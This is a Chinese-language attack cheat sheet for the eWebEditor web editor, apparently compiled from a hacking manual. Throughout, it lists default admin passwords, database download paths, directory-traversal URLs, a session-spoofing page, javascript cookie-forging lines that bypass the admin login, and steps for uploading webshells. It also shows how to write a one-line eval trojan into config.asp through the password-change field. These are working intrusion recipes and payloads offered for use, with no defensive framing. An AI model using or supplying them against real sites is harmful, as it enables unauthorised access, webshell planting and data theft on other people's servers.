# 弱口令
```
ewebeditor-v2

/ewebeditor/admin_login.asp?action=login

用户名: admin 密码: admin
用户名: admin 密码: admin888

数据库泄露
/ewebeditor/db/ewebeditor.mdb
/ewebeditor/db/db.mdb
/ewebeditor/db/#ewebeditor.mdb


ewebeditor-v11

/eWebEditor/admin/login.aspx?action=login

用户名: admin 密码: admin
用户名: admin 密码: admin888


ewebeditor-v12

/eWebEditor/admin/login.asp?action=login

用户名: admin 密码: admin
用户名: admin 密码: admin888

```
# 列目录

```
ewebeditor-v2

/admin/ewebeditor/admin/upload.asp?id=16&d_viewmode=&dir=./..

/admin/editor/uploadfile.asp?id=16&d_viewmode=&dir=./..

/admin/ewebeditor/admin/editor/uploadfile.asp?id=16&d_viewmode=&dir=./..
```
# 收集
```
https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/

eWebEditor
eWebEditor 基础知识
默认后台地址：
/ewebeditor/admin_login.asp
/WebEdior/admin/login.aspx
建议最好检测下admin_style.asp文件是否可以直接访问

默认数据库路径：

[PATH]/db/ewebeditor.mdb
[PATH]/db/db.mdb             
[PATH]/db/%23ewebeditor.mdb   
默认密码：
admin/admin888 、 admin/admin、 admin/123456 、admin/admin999

点击“样式管理”—可以选择新增样式，或者修改一个非系统样式，将其中图片控件所允许的上传类型后面加上|asp、|asa、|aaspsp或|cer，只要是服务器允许执行的脚本类型即可，点击“提交”并设置工具栏—将“插入图片”控件添加上。而后—预览此样式，点击插入图片，上传WEBSHELL，在“代码”模式中查看上传文件的路径。

2、当数据库被管理员修改为asp、asa后缀的时候，可以插一句话木马服务端进入数据库，然后一句话木马客户端连接拿下webshell
3、上传后无法执行？目录没权限？帅锅你回去样式管理看你编辑过的那个样式，里面可以自定义上传路径的！！！
4、设置好了上传类型，依然上传不了麽？估计是文件代码被改了，可以尝试设定“远程类型”依照6.0版本拿SHELL的方法来做（详情见下文↓），能够设定自动保存远程文件的类型。
5、不能添加工具栏，但设定好了某样式中的文件类型，怎么办？↓这么办！
(请修改action字段)
Action.html
6、需要突破上传文件类型限制么？Come here! —>> 将图片上传类型修改为“aaspsp;”(不含引号)，将一句话shell文件名改为“1.asp;”(不含引号)并上传即可。—>本条信息来源：微笑刺客

eWebEditor 可下载数据库，但密文解不开
脆弱描述：
当我们下载数据库后查询不到密码MD5的明文时，可以去看看webeditor_style(14)这个样式表，看看是否有前辈入侵过 或许已经赋予了某控件上传脚本的能力，构造地址来上传我们自己的WEBSHELL.
攻击利用:
比如 ID=46 s-name =standard1
构造 代码: ewebeditor.asp?id=content&style=standard
ID和和样式名改过后
ewebeditor.asp?id=46&style=standard1

eWebEditor遍历目录漏洞
脆弱描述：
ewebeditor/admin_uploadfile.asp
admin/upload.asp
过滤不严，造成遍历目录漏洞
攻击利用:
第一种:ewebeditor/admin_uploadfile.asp?id=14
在id=14后面添加&dir=..
再加 &dir=../..
&dir=http://navisec.it/../.. 看到整个网站文件了
第二种: ewebeditor/admin/upload.asp?id=16&d_viewmode=&dir =./..

eWebEditor 5.2 列目录漏洞
脆弱描述：
ewebeditor/asp/browse.asp
过滤不严，造成遍历目录漏洞
攻击利用：
http://navisec.it/ewebeditor/asp/browse.asp?style=standard650&dir=…././/..

利用eWebEditor session欺骗漏洞,进入后台
脆弱描述：
漏洞文件:Admin_Private.asp
只判断了session，没有判断cookies和路径的验证问题。
攻击利用:
新建一个test.asp内容如下:
<%Session(“eWebEditor_User”) = “11111111”%>
访问test.asp，再访问后台任何文件，for example:Admin_Default.asp

eWebEditor asp版 2.1.6 上传漏洞
攻击利用:（请修改action字段为指定网址）
ewebeditor asp版2.1.6上传漏洞利用程序.html

eWebEditor 2.7.0 注入漏洞
攻击利用:
http://navisec.it/ewebeditor/ewebeditor.asp?id=article_content&style=full_v200
默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解.

eWebEditor2.8.0最终版删除任意文件漏洞
脆弱描述：
此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。
攻击利用: (请修改action字段为指定网址)
Del Files.html

eWebEditor PHP/ASP 后台通杀漏洞
影响版本: PHP ≥ 3.0~3.8与asp 2.8版也通用，或许低版本也可以，有待测试。
攻击利用:
进入后台/eWebEditor/admin/login.php,随便输入一个用户和密码,会提示出错了.
这时候你清空浏览器的url,然后输入

javascript:alert(document.cookie=”adminuser=”+escape(“admin”));
javascript:alert(document.cookie=”adminpass=”+escape(“admin”));
javascript:alert(document.cookie=”admindj=”+escape(“1”));

而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。

eWebEditor for php任意文件上传漏洞
影响版本:ewebeditor php v3.8 or older version
脆弱描述:
此版本将所有的风格配置信息保存为一个数组$aStyle,在php.ini配置register_global为on的情况下我们可以任意添加自己喜欢的风格，并定义上传类型。
攻击利用:
phpupload.html

eWebEditor JSP版漏洞
大同小异，我在本文档不想多说了，因为没环境 测试，网上垃圾场那么大，不好排查。用JSP编辑器的我觉得eweb会比FCKeditor份额少得多。

eWebEditor 2.8 商业版插一句话木马
影响版本:=>2.8 商业版
攻击利用:
登陆后台，点击修改密码—-新密码设置为 1":eval request("h")’
设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了.

注意：可能因为转载的关系，代码会变掉，最好本地调试好代码再提交。

eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)
脆弱描述：
WebEditorNet 主要是一个upload.aspx文件存在上传漏洞。
攻击利用:
默认上传地址：/ewebeditornet/upload.aspx
可以直接上传一个cer的木马
如果不能上传则在浏览器地址栏中输入javascript:lbtnUpload.click();
成功以后查看源代码找到uploadsave查看上传保存地址，默认传到uploadfile这个文件夹里。

southidceditor(一般使用v2.8.0版eWeb核心)
http://navisec.it/admin/southidceditor/datas/southidceditor.mdb
http://navisec.it/admin/southidceditor/admin/admin_login.asp
http://navisec.it/admin/southidceditor/popup.asp
bigcneditor(eWeb 2.7.5 VIP核心)
其实所谓的Bigcneditor就是eWebEditor 2.7.5的VIP用户版.之所以无法访问admin_login.asp，提示“权限不够”4字真言，估计就是因为其授权“Licensed”问题,或许只允许被授权的机器访问后台才对。

或许上面针对eWebEditor v2.8以下低版本的小动作可以用到这上面来.貌似没多少动作?☹
```
